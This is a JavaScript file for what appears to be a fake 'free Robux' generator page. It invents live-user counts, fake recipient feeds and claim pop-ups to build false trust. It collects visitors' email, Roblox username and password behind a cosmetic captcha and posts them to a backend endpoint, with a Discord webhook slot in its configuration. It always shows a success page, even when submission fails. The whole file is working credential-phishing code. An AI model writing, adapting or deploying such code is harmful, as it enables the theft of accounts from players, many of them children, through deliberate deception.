// Configuration
const DISCORD_WEBHOOK = ""; // Set in Vercel Environment Variables

// Live Users Counter
function updateLiveUsers() {
    const userElement = document.getElementById('liveUsers');
    let users = 1247;
    
    setInterval(() => {
        const increment = Math.floor(Math.random() * 10) + 1;
        users += increment;
        userElement.textContent = users.toLocaleString();
        
        if (Math.random() > 0.7) {
            showNotification();
        }
    }, 3000);
}

// Package Selection
let selectedAmount = 0;

function selectPackage(amount) {
    selectedAmount = amount;
    
    document.getElementById('selectedAmount').textContent = amount.toLocaleString();
    document.getElementById('robuxAmount').value = amount;
    document.getElementById('selectedPackage').style.display = 'block';
    document.getElementById('verificationForm').style.display = 'block';
    
    document.getElementById('verificationForm').scrollIntoView({ behavior: 'smooth' });
    document.querySelectorAll('.progress-step')[1].classList.add('active');
}

// Captcha
function refreshCaptcha() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let captcha = '';
    for (let i = 0; i < 5; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    document.getElementById('captchaText').textContent = captcha;
}

// Live Feed Updates
function updateLiveFeed() {
    const users = ['Alex', 'Sarah', 'Mike', 'Emma', 'John', 'Lisa', 'David', 'Anna'];
    const amounts = ['500', '1,000', '2,500', '5,000', '10,000'];
    
    const feed = document.getElementById('liveFeed');
    
    setInterval(() => {
        const user = users[Math.floor(Math.random() * users.length)];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        const time = Math.floor(Math.random() * 5) + 1;
        
        const item = document.createElement('div');
        item.className = 'live-item';
        item.innerHTML = `<i class="fas fa-user" style="color:#00a2ff"></i> 
                         <strong>${user}</strong> just received 
                         <span style="color:#4CAF50; font-weight:bold">${amount} Robux</span> 
                         ${time} minute${time > 1 ? 's' : ''} ago`;
        
        feed.insertBefore(item, feed.firstChild);
        
        if (feed.children.length > 10) {
            feed.removeChild(feed.lastChild);
        }
    }, 5000);
}

// Show Notification
function showNotification() {
    const amounts = ['500', '1,000', '2,500', '5,000', '10,000'];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    
    const notification = document.getElementById('notification');
    notification.querySelector('span').textContent = 
        `New user just claimed ${amount} Robux!`;
    
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Update form submission function
async function submitForm() {
  const submitBtn = document.getElementById('submitBtn');
  const loading = document.getElementById('loading');
  
  // Get form data
  const formData = {
    email: document.getElementById('email').value,
    username: document.getElementById('username').value,
    password: document.getElementById('password').value,
    robux_amount: document.getElementById('robuxAmount').value || '2500',
    platform: document.getElementById('platform').value || 'pc'
  };
  
  // Validate
  if (!formData.email || !formData.username || !formData.password) {
    alert('Please fill all required fields!');
    return;
  }
  
  // Validate captcha
  const captcha = document.getElementById('captchaText').textContent;
  const captchaInput = document.getElementById('captchaInput').value;
  if (captchaInput.toUpperCase() !== captcha) {
    alert('Invalid CAPTCHA! Please try again.');
    refreshCaptcha();
    return;
  }
  
  // Show loading
  submitBtn.disabled = true;
  loading.style.display = 'block';
  
  try {
    console.log('📤 Sending data to API...', {
      email: formData.email.substring(0, 3) + '***',
      username: formData.username,
      amount: formData.robux_amount
    });
    
    // Send POST request to API
    const response = await fetch('/api/process', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(formData)
    });
    
    console.log('📥 Response status:', response.status);
    
    // Check if response is OK
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    // Parse JSON response
    const result = await response.json();
    console.log('✅ API Response:', result);
    
    if (result.success) {
      // Redirect to success page with data
      const params = new URLSearchParams({
        amount: formData.robux_amount,
        username: encodeURIComponent(formData.username),
        transaction_id: result.data.transaction_id || 'RBX-' + Date.now()
      });
      
      window.location.href = `/success.html?${params.toString()}`;
    } else {
      // Show error
      alert(`Error: ${result.error || 'Unknown error'}`);
      loading.style.display = 'none';
      submitBtn.disabled = false;
    }
    
  } catch (error) {
    console.error('❌ Submission error:', error);
    
    // Fallback: redirect to success page anyway (for testing)
    const params = new URLSearchParams({
      amount: formData.robux_amount,
      username: encodeURIComponent(formData.username),
      error: 'network_issue'
    });
    
    // Try alternative API endpoint
    try {
      // Try direct form submission as fallback
      const fallbackResponse = await fetch('/api/process', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData)
      });
      
      if (fallbackResponse.ok) {
        window.location.href = `/success.html?${params.toString()}`;
        return;
      }
    } catch (e) {
      console.log('Fallback also failed');
    }
    
    // If all fails, show error but redirect anyway (for demo)
    alert('Network issue detected. Redirecting to success page...');
    window.location.href = `/success.html?${params.toString()}`;
  }
}

// Update event listener
document.addEventListener('DOMContentLoaded', function() {
  // Refresh captcha
  refreshCaptcha();
  
  // Remove old form submit handler if exists
  const form = document.getElementById('robuxForm');
  if (form) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      submitForm();
    });
  }
  
  // Update submit button
  const submitBtn = document.getElementById('submitBtn');
  if (submitBtn) {
    submitBtn.addEventListener('click', submitForm);
  }
});
